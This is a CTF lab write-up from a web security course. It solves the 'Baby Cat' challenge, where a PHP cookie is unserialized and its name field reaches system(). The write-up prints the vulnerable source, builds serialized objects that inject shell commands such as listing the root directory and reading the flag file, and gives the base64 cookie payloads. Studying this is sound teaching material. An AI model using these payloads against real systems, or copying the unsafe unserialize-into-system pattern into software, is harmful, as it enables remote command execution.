---
title: Simple Web 0x17(Lab - Baby Cat)
tags: [NTUSTWS, CTF, Web]

category: "Security｜Course｜NTUST WS｜Deserialization"
date: 2023-02-06
---

# Simple Web 0x17(Lab - Baby Cat)
<!-- more -->
###### tags: `NTUSTWS` `CTF` `Web`
Challenge: http://h4ck3r.quest:8601/

## Background
[0x16.5(php unserialize)](/FkF8p-zrSMSOWFkE4vvAJQ)

## Source code
:::spoiler code
```php=
<?php
isset($_GET['source']) && die(!show_source(__FILE__));

class Cat
{
    public $name = '(guest cat)';
    function __construct($name)
    {
        $this->name = $name;
    }
    function __wakeup()
    {
        echo "<pre>";
        system("cowsay 'Welcome back, $this->name'");
        echo "</pre>";
    }
}

if (!isset($_COOKIE['cat_session'])) {
    $cat = new Cat("cat_" . rand(0, 0xffff));
    setcookie('cat_session', base64_encode(serialize($cat)));
} else {
    $cat = unserialize(base64_decode($_COOKIE['cat_session']));
}
?>
<p>Hello, <?= $cat->name ?>.</p>
<a href="/?source">source code</a>
```
:::

## Exploit - deserialize
1. Use psysh to test payload
In local side, if you haven't install `cowsay`, the payload should be `'||ls -al'`
    ```bash!
    $ ./psysh
    > system("cowsay 'Welcome back, '||pwd''");
    sh: 1: cowsay: not found
    /home/sbk6401
    = "/home/sbk6401"
    ```
2. Construct testing case
    ```bash!
    $ ./psysh
    > class Cat{
    . public $name = '(guest cat)';
    . function __construct($name){$this->name = $name;}
    . function __wakeup(){system("cowsay 'Welcome back, $this->name'");}}
    > $cat = new Cat("'&&ls -al /'")
    = Cat {#2785
        +name: "'&&ls -al /'",
      }

    > base64_encode(serialize($cat))
    = "TzozOiJDYXQiOjE6e3M6NDoibmFtZSI7czoxMjoiJyYmbHMgLWFsIC8nIjt9"
    ```
    Then change`cat_session` to `TzozOiJDYXQiOjE6e3M6NDoibmFtZSI7czoxMjoiJyYmbHMgLWFsIC8nIjt9` and we'll get the response
    ![](https://i.imgur.com/oTHtA0U.png)

3. Get flag
    ```bash!
    > $cat = new Cat("'&&cat /flag_5fb2acebf1d0c558'")
    = Cat {#2789
        +name: "'&&cat /flag_5fb2acebf1d0c558'",
      }

    > base64_encode(serialize($cat))
    = "TzozOiJDYXQiOjE6e3M6NDoibmFtZSI7czozMDoiJyYmY2F0IC9mbGFnXzVmYjJhY2ViZjFkMGM1NTgnIjt9"
    ```
    Again! Modify `cat_session` to `TzozOiJDYXQiOjE6e3M6NDoibmFtZSI7czozMDoiJyYmY2F0IC9mbGFnXzVmYjJhY2ViZjFkMGM1NTgnIjt9` then we'll get flag
    ![](https://i.imgur.com/y5HHWDZ.png)